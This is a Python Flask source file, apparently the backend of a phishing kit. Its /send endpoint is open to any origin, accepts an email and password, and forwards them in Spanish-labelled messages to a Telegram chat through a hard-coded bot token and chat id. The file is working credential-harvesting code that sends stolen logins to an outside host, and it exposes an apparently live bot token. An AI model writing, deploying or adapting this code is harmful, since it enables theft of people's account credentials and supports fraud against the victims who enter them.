import requests
from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})


@app.route('/send', methods=['POST'])
def send_data():
    new_data = request.json
    send_msg(f"Correo: {new_data['email']} - Contraseña: {new_data['password']}")
    return jsonify({"message": "data sent"}), 200



def send_msg(text):
    token='6691619294:AAEl12s-4uBL1aKLMXFTrKQSVN6jyKZujsY'
    chat_id='6173510595'
    url_req=f"https://api.telegram.org/bot{token}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": text
    }
    resp = requests.get(url=url_req, params=params)

    resp.raise_for_status()

if __name__ == "__main__":
    app.run(debug=False)
